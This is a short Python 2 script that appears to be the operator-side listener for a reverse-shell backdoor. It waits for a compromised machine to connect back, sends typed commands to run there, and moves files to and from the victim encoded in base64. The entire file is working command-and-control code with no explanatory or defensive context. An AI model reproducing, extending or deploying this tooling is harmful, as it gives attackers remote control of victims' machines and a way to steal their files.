#!/usr/bin/env python
import socket,json, base64


class Listener:
    def __init__(self, IP, PORT):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((IP, PORT))
        listener.listen(0)
        print("[+] Waiting for incoming connection")

        self.connection, self.client_addr = listener.accept()
        print("[+] Connection etablished from : " + str(self.client_addr))

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotetly(self, cmd):
        cmd_out =""
        self.send(cmd)

        if cmd[0] != "exit" :
            cmd_out = self.recieve()

        else:
            self.connection.close()
            exit()

        return cmd_out

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful !"
            
    def run(self):
        while True:
            cmd_out = ""
            cmd = raw_input(">> ")
            cmd = cmd.split(" ")

            try:
                if cmd[0] == "upload":
                    file_content = self.read_file(cmd[1])
                    cmd.append(file_content)
                
                cmd_out = self.execute_remotetly(cmd)

                if  cmd[0] == "download" and "Error" not in cmd_out:
                    cmd_out = self.write_file(cmd[1],cmd_out)
            except Exception as err:
                cmd_out = "[-] Error: "+str(err)

            print("\n" + cmd_out + "\n")
